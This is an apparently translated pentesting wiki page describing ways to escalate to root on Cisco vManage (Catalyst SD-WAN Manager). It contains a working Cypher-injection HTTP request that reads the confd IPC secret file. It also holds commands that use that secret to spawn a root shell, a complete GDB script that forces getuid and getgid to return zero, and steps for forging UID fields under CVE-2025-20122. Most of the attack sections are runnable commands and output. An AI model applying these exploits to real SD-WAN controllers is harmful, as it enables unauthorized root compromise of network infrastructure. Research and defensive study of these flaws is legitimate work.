# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Put 1

(Primer iz [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nakon što smo malo istražili kroz neku [dokumentaciju](http://66.218.245.39/doc/html/rn03re18.html) vezanu za `confd` i različite binarne fajlove (pristupno sa nalogom na Cisco veb-sajtu), otkrili smo da za autentifikaciju IPC socketa koristi tajnu koja se nalazi u `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Sećate li se naše Neo4j instance? Ona radi pod privilegijama korisnika `vmanage`, što nam omogućava da dohvatimo fajl koristeći prethodnu vulnerability:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, možemo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim skupom argumenata. Međutim, on nije čitljiv sa našim trenutnim privilegijama, pa ga moramo preuzeti iz rootfs-a i kopirati pomoću scp, pročitati pomoć i koristiti ga da dobijemo shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Put 2

(Primer iz [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ tima synacktiv opisao je elegantan način da se dobije root shell, ali upozorenje je da to zahteva dobijanje kopije `/usr/bin/confd_cli_user` koja je čitljiva samo za root. Pronašao sam drugi način da eskaliram privilegije do root bez takve muke.

Kada sam disasemblirao binar `/usr/bin/confd_cli`, primetio sam sledeće:

<details>
<summary>Objdump prikazuje prikupljanje UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Kada pokrenem “ps aux”, primetio sam sledeće (_napomena -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Pretpostavio sam da program “confd_cli” prosleđuje UID i GID koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.

Prvi pokušaj bio je da pokrenem “cmdptywrapper” direktno i prosledim mu `-g 0 -u 0`, ali nije uspelo. Izgleda da je negde usput kreiran file descriptor (-i 1015) i ne mogu ga falsifikovati.

Kao što je pomenuto na synacktiv’s blog (poslednji primer), program `confd_cli` ne podržava argumente komandne linije, ali mogu da utičem na njega pomoću debagera i, srećom, GDB je dostupan na sistemu.

Napravio sam GDB skript u kojem sam naterao API `getuid` i `getgid` da vraćaju 0. Pošto već imam “vmanage” privilegiju kroz deserialization RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Konzolni izlaz:

<details>
<summary>Konzolni izlaz</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Put 3 (greška validacije unosa CLI-a iz 2025.)

Cisco je preimenovao vManage u *Catalyst SD-WAN Manager*, ali osnovni CLI i dalje radi na istoj mašini. Advisory iz 2025. (CVE-2025-20122) opisuje nedovoljnu validaciju unosa u CLI-u koja omogućava **bilo kojem autentifikovanom lokalnom korisniku** da dobije root slanjem posebno oblikovanog zahteva ka manager CLI servisu. Kombinujte bilo koji low-priv foothold (npr. Neo4j deserialization iz Path1, ili cron/backup user shell) sa ovim propustom da pređete na root bez kopiranja `confd_cli_user` ili attaching GDB:

1. Use your low-priv shell to locate the CLI IPC endpoint (tipično `cmdptywrapper` listener koji sluša na portu 4565, kao u Path2).
2. Craft a CLI request that forges UID/GID fields to 0. Greška u validaciji ne primenjuje UID originalnog pozivaoca, pa wrapper pokreće root-backed PTY.
3. Pipe any command sequence (`vshell; id`) through the forged request to obtain a root shell.

> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.

## Ostali nedavni vManage/Catalyst SD-WAN Manager vulns to chain

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript u specifična polja interfejsa; krađa admin sesije daje browser-driven put do `vshell` → local shell → Path3 do root-a.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
